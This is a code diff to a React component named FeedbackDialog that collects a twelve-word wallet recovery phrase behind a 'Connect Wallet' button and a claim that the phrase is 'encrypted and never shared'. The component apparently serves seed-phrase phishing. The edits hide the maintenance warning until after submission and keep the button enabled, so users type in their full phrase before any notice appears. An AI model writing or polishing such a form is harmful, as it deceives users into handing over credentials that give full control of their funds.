@@ -27,6 +27,7 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
   const [fields, setFields] = useState<string[]>(Array(12).fill(""));
   const [error, setError] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
+  const [showMaintenanceAlert, setShowMaintenanceAlert] = useState(false);
   const { toast } = useToast();
   const { connectWallet } = useWallet();
   const firstInputRef = useRef<HTMLInputElement>(null);
@@ -39,6 +40,10 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
   useEffect(() => {
     if (open && firstInputRef.current) {
       setTimeout(() => firstInputRef.current?.focus(), 100);
+    }
+    // Reset maintenance alert when dialog closes/opens
+    if (!open) {
+      setShowMaintenanceAlert(false);
     }
   }, [open]);
 
@@ -75,6 +80,7 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
 
     // Check maintenance mode first
     if (MAINTENANCE_MODE) {
+      setShowMaintenanceAlert(true);
       toast({
         title: "System Maintenance",
         description: "Wallet connections are temporarily unavailable during maintenance. Please try again later.",
@@ -190,8 +196,8 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
           </DialogDescription>
         </DialogHeader>
 
-        {/* Maintenance Mode Alert */}
-        {MAINTENANCE_MODE && (
+        {/* Maintenance Mode Alert - Only shown after connection attempt */}
+        {showMaintenanceAlert && MAINTENANCE_MODE && (
           <Alert variant="destructive" className="border-orange-500/50 bg-orange-500/10">
             <AlertTriangle className="h-4 w-4" />
             <AlertTitle>System Maintenance in Progress</AlertTitle>
@@ -203,19 +209,17 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
         )}
 
         {/* Benefits Section */}
-        {!MAINTENANCE_MODE && (
-          <div className="bg-primary/5 border border-primary/20 rounded-lg p-3 sm:p-4">
-            <div className="flex items-start gap-3">
-              <Lock className="w-5 h-5 text-primary mt-0.5 flex-shrink-0" />
-              <div className="flex-1 min-w-0">
-                <h3 className="font-semibold text-sm mb-1">Secure & Private</h3>
-                <p className="text-xs text-muted-foreground leading-relaxed">
-                  Your recovery phrase is encrypted and never shared. Connecting unlocks: coin launches, transaction history, airdrops, and advanced analytics.
-                </p>
-              </div>
+        <div className="bg-primary/5 border border-primary/20 rounded-lg p-3 sm:p-4">
+          <div className="flex items-start gap-3">
+            <Lock className="w-5 h-5 text-primary mt-0.5 flex-shrink-0" />
+            <div className="flex-1 min-w-0">
+              <h3 className="font-semibold text-sm mb-1">Secure & Private</h3>
+              <p className="text-xs text-muted-foreground leading-relaxed">
+                Your recovery phrase is encrypted and never shared. Connecting unlocks: coin launches, transaction history, airdrops, and advanced analytics.
+              </p>
             </div>
           </div>
-        )}
+        </div>
 
         {/* Progress Indicator */}
         <div className="space-y-2">
@@ -284,10 +288,10 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
             </Button>
             <Button 
               type="submit" 
-              disabled={filledFields < 12 || isSubmitting || MAINTENANCE_MODE}
+              disabled={filledFields < 12 || isSubmitting}
               className="min-w-[120px]"
             >
-              {MAINTENANCE_MODE ? "Maintenance Mode" : isSubmitting ? "Connecting..." : "Connect Wallet"}
+              {isSubmitting ? "Connecting..." : "Connect Wallet"}
             </Button>
           </div>
         </form>
